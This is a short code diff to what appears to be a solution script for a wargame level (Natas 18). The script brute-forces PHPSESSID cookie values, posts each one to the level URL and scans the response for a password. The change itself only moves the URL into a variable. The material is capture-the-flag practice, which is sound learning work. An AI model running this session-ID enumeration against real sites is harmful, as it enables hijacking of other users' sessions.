@@ -5,12 +5,14 @@ level_number = 18
 
 
 def get_secret(debug=False):
+    url = get_level_url(level_number)
+
     for i in range(1, natas18_max_session_id + 1):
         if debug:
             print(f"checking: {i}")
 
         req = get_request_object(level_number)
-        result = req.post(get_level_url(level_number), cookies={"PHPSESSID": str(i)})
+        result = req.post(url, cookies={"PHPSESSID": str(i)})
         text = result.text
         search = "Password:"
 
